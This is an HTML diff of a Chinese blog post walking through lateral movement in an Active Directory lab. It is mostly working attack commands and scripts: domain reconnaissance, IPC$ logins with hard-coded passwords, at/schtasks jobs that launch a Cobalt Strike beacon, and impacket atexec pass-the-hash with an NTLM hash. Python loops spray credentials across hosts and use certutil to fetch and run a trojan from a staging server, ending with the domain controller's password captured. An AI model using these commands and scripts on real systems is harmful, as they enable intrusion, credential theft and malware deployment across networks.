@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网横向移动 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网横向移动</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-09-27 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/c1ce75c9/bfl2kYExirJ2o8jENtd6_g.png" alt="img"><br><img src="/posts/c1ce75c9/image-20220927161548820.png" alt="image-20220927161548820"><br>只有webserver出网，我们已经拿到webserver的shell，尝试对其他内网主机进行横向移动</p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>需要收集:目标 用户 凭据 网络<br>查看该主机是否为域环境 (cs命令行下需要在前面加shell)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c1ce75c9/image-20220927161913233.png" alt="image-20220927161913233"></p>
+<p>获取域控ip地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping OWA2010CN-God.god.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c1ce75c9/image-20220927162118801.png" alt="image-20220927162118801"></p>
+<p>可以看到192.168.3.21可能为域控<br>获取域内用户名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c1ce75c9/image-20220927162536034.png" alt="image-20220927162536034"></p>
+<p>接下来用插件提权<br><img src="/posts/c1ce75c9/image-20220927162851592.png" alt="image-20220927162851592"><br><img src="/posts/c1ce75c9/image-20220927162903508.png" alt="image-20220927162903508"><br><img src="/posts/c1ce75c9/image-20220927162939083.png" alt="image-20220927162939083"></p>
+<p>接下来用插件进行端口扫描发现主机<br><img src="/posts/c1ce75c9/image-20220927162719180.png" alt="image-20220927162719180"><br><img src="/posts/c1ce75c9/image-20220927163242046.png" alt="image-20220927163242046"><br><img src="/posts/c1ce75c9/image-20220927163735058.png" alt="image-20220927163735058"><br>获取明文密码<br><img src="/posts/c1ce75c9/image-20220927164105343.png" alt="image-20220927164105343"><br>抓取hash<br><img src="/posts/c1ce75c9/image-20220927164322560.png" alt="image-20220927164322560"><br><img src="/posts/c1ce75c9/image-20220927164448467.png" alt="image-20220927164448467"></p>
+<h2 id="域横向移动-IPC"><a href="#域横向移动-IPC" class="headerlink" title="域横向移动-IPC"></a>域横向移动-IPC</h2><h3 id="什么是ipc"><a href="#什么是ipc" class="headerlink" title="什么是ipc?"></a>什么是ipc?</h3><p>IPC是专用管道，可以实现对远程计算机的访问，<br>需要使用目标系统用户的账号密码，使用139、445端口。</p>
+<p>利用步骤:</p>
+<ol>
+<li>建立IPC链接到目标主机</li>
+<li>拷贝要执行的命令脚本到目标主机</li>
+<li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li>
+<li>删除IPC链接</li>
+</ol>
+<p>命令:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\server\ipc$ &quot;password&quot; /user:username # 工作组</span><br><span class="line">net use \\server\ipc$ &quot;password&quot; /user:domain\username #域内</span><br><span class="line">dir \\xx.xx.xx.xx\C$\        # 查看文件列表</span><br><span class="line">copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件</span><br><span class="line">copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件</span><br><span class="line">net use \\xx.xx.xx.xx\C$\1.bat /del # 删除IPC</span><br><span class="line">net view xx.xx.xx.xx        # 查看对方共享</span><br></pre></td></tr></table></figure>
+
+<p>建立IPC常见的错误代码<br>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限<br>（2）51：网络问题，Windows 无法找到网络路径<br>（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题<br>（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$<br>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除<br>（6）1326：账号密码错误<br>（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况<br>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p>
+<p>建立IPC失败的可能原因<br>（1）目标系统不是NT或以上的操作系统<br>（2）对方没有打开IPC$共享<br>（3）对方未开启139、445端口，或者被防火墙屏蔽<br>（4）输出命令、账号密码有错误</p>
+<h3 id="命令版-at-amp-schtasks"><a href="#命令版-at-amp-schtasks" class="headerlink" title="命令版-at&amp;schtasks"></a>命令版-at&amp;schtasks</h3><p>0、上线配置</p>
+<p>上线其他主机有两种方式:<br>正向：建立正向木马由webserver这台主机去连接达到上线<br><img src="/posts/c1ce75c9/image-20220927165732535.png" alt="image-20220927165732535"></p>
+<p>反向：在webserver建立监听器其他主机反向连接到webserver达到转发上线<br>代理转发-&gt;转发上线-&gt;beacon.exe<br><img src="/posts/c1ce75c9/image-20220927181726329.png" alt="image-20220927181726329"><br><img src="/posts/c1ce75c9/image-20220927183757084.png" alt="image-20220927183757084"></p>
+<p>在实战中如何将木马上传并且执行呢(以反向连接为例)<br>先将我们生成的木马上传到webserver主机<br><img src="/posts/c1ce75c9/image-20220927183945820.png" alt="image-20220927183945820"><br><img src="/posts/c1ce75c9/image-20220927184013184.png" alt="image-20220927184013184"></p>
+<p>接下来就要用到IPC了</p>
+<p>1、at</p>
+<p>适用版本 &lt; Windows2012</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator #建立ipc连接：</span><br><span class="line">copy beacon.exe \\192.168.3.21\c$ 	#拷贝执行文件到目标机器</span><br><span class="line">at \\192.168.3.21 18:45 c:\beacon.exe  #添加计划任务</span><br></pre></td></tr></table></figure>
+
+<p>2、schtasks<br>适用版本 &gt;&#x3D;Windows2012</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接：</span><br><span class="line">copy zhufa.exe \\192.168.3.32\c$ #复制文件到其C盘</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务</span><br><span class="line">schtasks /delete /s 192.168.3.32 /tn beacon /f #删除beacon任务</span><br></pre></td></tr></table></figure>
+
+<h3 id="插件版-CS-amp-LSTARS"><a href="#插件版-CS-amp-LSTARS" class="headerlink" title="插件版-CS&amp;LSTARS"></a>插件版-CS&amp;LSTARS</h3><p>LSTARS-横向移动-IPC连接<br><img src="/posts/c1ce75c9/image-20220927191420684.png" alt="image-20220927191420684"><br><img src="/posts/c1ce75c9/image-20220927191642464.png" alt="image-20220927191642464"><br><img src="/posts/c1ce75c9/image-20220927191652170.png" alt="image-20220927191652170"></p>
+<h3 id="套件版-Impacket-atexec"><a href="#套件版-Impacket-atexec" class="headerlink" title="套件版-Impacket-atexec"></a>套件版-Impacket-atexec</h3><p>impacket-atexec<br>该工具是一个半交互的工具，适用于Webshell下，Socks代理下;<br>在渗透利用中可以收集用户名、明文密码、密码hash、远程主机等做成字典，批量测试</p>
+<p>1、Py版：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br>利用ipc执行命令并回显</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line">python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将木马放到webserver的web站点然后利用命令让其他主机下载木马并执行<br><img src="/posts/c1ce75c9/image-20220927213624492.png" alt="image-20220927213624492"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py god/administrator:Admin12345@192.168.3.21 &quot;certutil.exe -urlcache -split -f http://192.168.3.31:80/zhufa.exe test.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>2、Exe版：<a target="_blank" rel="noopener" href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS本地用户明文连接：</span></span><br><span class="line">shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS域内用户明文连接：</span></span><br><span class="line">shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS域内本地用户明文密文连接：</span></span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="代理版-Socks-amp-Py-amp-atexec"><a href="#代理版-Socks-amp-Py-amp-atexec" class="headerlink" title="代理版-Socks&amp;Py&amp;atexec"></a>代理版-Socks&amp;Py&amp;atexec</h3><p>攻击全由本机发出通过socks代理向内网通讯</p>
+<p>1、建立SOCK节点并连接<br><img src="/posts/c1ce75c9/image-20220927195928499.png" alt="image-20220927195928499"><br>用Proxifier配置代理<br><img src="/posts/c1ce75c9/image-20220927200528255.png" alt="image-20220927200528255"><br><img src="/posts/c1ce75c9/image-20220927200548849.png" alt="image-20220927200548849"><br><img src="/posts/c1ce75c9/image-20220927200907617.png" alt="image-20220927200907617"></p>
+<p>2、自写脚本批量下载上线</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;itadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vpnadm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">passs=&#123;</span><br><span class="line">    <span class="string">&#x27;admin!@#45&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#下载后门</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xz</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                exec1=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py ./administrator:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe c:/test.exe&quot;&#x27;</span></span><br><span class="line">                exec2=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py god/&#x27;</span>+user+<span class="string">&#x27;:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe c:/test.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    xz()</span><br></pre></td></tr></table></figure>
+
+<p>192.168.3.32，192.168.3.29下载成功<br><img src="/posts/c1ce75c9/image-20220928110301622.png" alt="image-20220928110301622"><br><img src="/posts/c1ce75c9/image-20220928110338368.png" alt="image-20220928110338368"></p>
+<p>执行木马</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ips = [<span class="string">&#x27;192.168.3.29&#x27;</span>, <span class="string">&#x27;192.168.3.32&#x27;</span>]</span><br><span class="line">passs = [<span class="string">&#x27;admin!@#45&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> passs:</span><br><span class="line">            cmd = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py god/administrator:&#x27;</span> + pwd + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;zx.exe&quot;&#x27;</span></span><br><span class="line">            cmd1 = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py ./administrator:&#x27;</span> + pwd + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;zx.exe&quot;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(cmd)</span><br><span class="line">            os.system(cmd)</span><br><span class="line">            os.system(cmd1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c1ce75c9/image-20220928112057717.png" alt="image-20220928112057717"><br>成功上线两台主机</p>
+<p>3、继续收集凭据横向移动<br>利用刚刚上线的主机获取密码和hash继续横向移动，改下脚本<br><img src="/posts/c1ce75c9/image-20220928120147723.png" alt="image-20220928120147723"></p>
+<p>下载木马</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#下载后门</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xz</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                exec1=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@&#x27;</span>+ip+<span class="string">&#x27;&quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe test.exe&quot;&#x27;</span></span><br><span class="line">                exec2=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe test.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    xz()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c1ce75c9/image-20220928121619404.png" alt="image-20220928121619404"></p>
+<p><img src="/posts/c1ce75c9/image-20220928121644442.png" alt="image-20220928121644442"></p>
+<p>执行木马</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ips = [<span class="string">&#x27;192.168.3.21&#x27;</span>, <span class="string">&#x27;192.168.3.25&#x27;</span>, <span class="string">&#x27;192.168.3.30&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        cmd = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span> + ip + <span class="string">&#x27; &quot;test.exe&quot;&#x27;</span></span><br><span class="line">        cmd1 = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span> + ip + <span class="string">&#x27; &quot;test.exe&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(cmd)</span><br><span class="line">        os.system(cmd)</span><br><span class="line">        os.system(cmd1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    zx()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c1ce75c9/image-20220928122959205.png" alt="image-20220928122959205"><br>再次抓明文密码<br><img src="/posts/c1ce75c9/image-20220928123258847.png" alt="image-20220928123258847"><br>成功拿到域控密码</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/84ae0305/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-09-27 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">内网横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-text">环境介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">域信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-IPC"><span class="toc-text">域横向移动-IPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFipc"><span class="toc-text">什么是ipc?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%89%88-at-amp-schtasks"><span class="toc-text">命令版-at&amp;schtasks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E7%89%88-CS-amp-LSTARS"><span class="toc-text">插件版-CS&amp;LSTARS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E4%BB%B6%E7%89%88-Impacket-atexec"><span class="toc-text">套件版-Impacket-atexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E7%89%88-Socks-amp-Py-amp-atexec"><span class="toc-text">代理版-Socks&amp;Py&amp;atexec</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
